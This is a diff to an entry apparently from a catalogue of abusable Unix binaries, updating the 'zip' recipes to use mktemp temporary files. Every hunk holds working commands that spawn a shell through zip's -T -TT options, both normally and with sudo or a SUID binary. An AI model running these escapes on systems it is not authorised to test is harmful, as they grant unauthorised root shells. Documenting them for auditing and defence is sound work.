@@ -2,14 +2,17 @@
 functions:
   execute-interactive:
     - code: |
-        zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
-        rm /tmp/x.zip
+        TF=$(mktemp -u)
+        zip $TF /etc/hosts -T -TT 'sh #'
+        rm $TF
   sudo-enabled:
     - code: |
-        sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
-        sudo rm /tmp/x.zip
+        TF=$(mktemp -u)
+        sudo zip $TF /etc/hosts -T -TT 'sh #'
+        sudo rm $TF
   suid-limited:
     - code: |
-        ./zip /tmp/x.zip /etc/hosts -T -TT 'sh #'
-        sudo rm /tmp/x.zip
+        TF=$(mktemp -u)
+        ./zip $TF /etc/hosts -T -TT 'sh #'
+        sudo rm $TF
 ---
